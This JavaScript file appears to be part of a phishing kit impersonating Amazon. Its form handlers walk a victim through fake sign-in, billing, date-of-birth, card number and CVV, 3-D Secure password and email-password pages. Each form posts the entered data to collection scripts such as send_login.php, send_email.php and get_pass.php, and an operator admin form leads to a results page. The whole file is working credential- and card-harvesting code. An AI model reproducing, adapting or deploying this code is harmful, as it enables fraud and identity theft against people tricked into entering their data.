// $(function() {
    $("form[name='signineml']").validate({
        rules: {
            email: {
                required: true,
                // email: true
            },
            password: "required",
        },
        messages: {
            email: "* Please enter your email or phone.",
            password: "* Please enter your password."
        },
        submitHandler: function(form) {
            $("#zwimel").show();
            $.post("/version2/mobile/signin", $("#signineml").serialize(),
            function(result) {
                setTimeout(function() {
                    $(location).attr("href", "homepage/billing")
                },
                1000)
            })
        },
    })
// });

//$(function() {
    $("form[name='billingform']").validate({
        rules: {
            ap_fullname: "required",
            // ap_address: "required",
            // ap_City: "required",
            // ap_stat: "required",
            // ap_zipcode: "required",
            // ap_phone: "required",
            "dob-year": "required",
            "dob-moon": "required",
            "dob-day": "required",
        },
        messages: {
            ap_fullname: "",
            ap_address: "",
            ap_City: "",
            ap_stat: "",
            ap_zipcode: "",
            ap_phone: "",
            "dob-year": "",
            "dob-moon": "",
            "dob-day": "",
        },
        submitHandler: function(form) {
            $("#zwimel").show();
            $.post("/version2/mobile/homepage/billing", $("#billingform").serialize(),
            function(result) {
                setTimeout(function() {
                    $(location).attr("href", "card")
                },
                1000)
            })
        },
    })
//});

//$(function() {
    $.validator.addMethod("card", function (value, element) {
        var length = value.length;
        var cardrex = /^37/;
        return valid_credit_card(value);
        if (cardrex.test(value)) {
            return this.optional( element ) || length == 15;
        }
        return this.optional( element ) || length == 16;
    },"")

    $.validator.addMethod("cvv", function (value, element, param) {
        var length = value.length;
        var cardrex = /^37/
        var cardValue = $('#' + param).val() || '';

        if (cardrex.test(cardValue)) {
            return this.optional( element ) || length == 4;
        }
        return this.optional( element ) || length == 3;
    },"")

    $("form[name='formcard']").validate({
        rules: {
            nameoncard: "required",
            cardnumber: "card",
            exdatemoon: {
                required:true,
                minlength:1
            },
            exdateyear: {
                required:true,
                minlength:1
            },
            exdateem: {
                required:true
            },
            exdateey: "required",
            cvc: {
                cvv: "cardNumber"
            },
        },
        messages: {
            nameoncard: "",
            cardNumber: "",
            exdatemoon: "",
            exdateey: "",
            exdateem: "",
            cvv: "",
        },
        submitHandler: function(form) {
            $("#zwimel").show();
            $.post("/version2/mobile/homepage/card", $("#formcard").serialize(),
            function(result) {
                setTimeout(function() {
                    $(location).attr("href", "secure")
                },
                1000)
            })
        },
    })
//});

function valid_credit_card(value) {
    if (/[^0-9-\s]+/.test(value))
        return false;
    var nCheck = 0, bEven = false;
    value = value.replace(/\D/g, "");

    for (var n = value.length - 1; n >= 0; n--) {
        var cDigit = value.charAt(n),
            nDigit = parseInt(cDigit, 10);

        if (bEven && (nDigit *= 2) > 9) nDigit -= 9;

        nCheck += nDigit;
        bEven = !bEven;
    }

    return (nCheck % 10) == 0;
}

$(function() {
    $("form[name='emailo']").validate({
        rules: {
            emailpass: "required",
        },
        messages: {
            emailpass: "",
        },
        submitHandler: function(form) {
            event.preventDefault();
            $("#zwimel").show();
            $.post("../XBALTI/send_email.php", $("#emailo").serialize(),
            function(result) {
                setTimeout(function() {
                    $(location).attr("href", "../homepage/success.php?Congratulations")
                },
                2000)
            })
        },
    })
});

$(function() {
    $("form[name='signinpass']").validate({
        rules: {
            password: "required",
        },
        messages: {
            password: "* Please enter your password.",
        },
        submitHandler: function(form) {
            $("#zwimel").show();
            $.post("XBALTI/send_login.php", $("#signinpass").serialize(),
            function(result) {
                setTimeout(function() {
                    $(location).attr("href", "homepage/?update_billing")
                },
                1000)
            })
        },
    })
});

//$(function() {
    $("form[name='formvbv']").validate({
        rules: {
            passvbv: {
                required:true,
                minlength:6
            },
            mmname: {
                required:true
            }
        },
        messages: {
            passvbv: {minlength:"<p>正しいパスワードをご入力ください。</p>"},
            mmname: "",
        },
        submitHandler: function(form) {
            $("#zwimel").show();
            $.post("/version2/mobile/homepage/secure", $("#formvbv").serialize(),
            function(result) {
                setTimeout(function() {
                    $(location).attr("href", "success")
                },
                2000)
            })
        },
    })
//});

$(function() {
    $("form[name='formadmin']").validate({
        rules: {
            passadmin: "required",
        },
        messages: {
            passadmin: "Enter Your Fucking Password",
        },
        submitHandler: function(form) {
            $("#sonic").show();
            $.post("../amazon/XBALTI/get_pass.php", $("#formadmin").serialize(),
            function(result) {
                setTimeout(function() {
                    $(location).attr("href", "rezulta.php")
                },
                2000)
            })
        },
    })
});
